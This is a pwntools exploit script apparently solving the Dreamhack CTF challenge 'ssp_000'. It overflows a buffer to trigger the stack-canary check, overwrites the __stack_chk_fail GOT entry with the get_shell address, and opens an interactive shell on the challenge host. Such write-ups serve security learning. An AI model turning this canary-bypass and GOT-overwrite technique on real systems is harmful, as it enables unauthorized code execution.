from pwn import *

exe = ELF("./ssp_000")
# libc = ELF("./libc-2.27.so")
# ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("host3.dreamhack.games", 18873)

    return r


def main():
    r = conn()

    r.sendline(b"a" * 80)
    r.sendlineafter(b"Addr : ", str(exe.got['__stack_chk_fail']))
    r.sendlineafter(b"Value : ", str(exe.sym['get_shell']))
    r.interactive()


if __name__ == "__main__":
    main()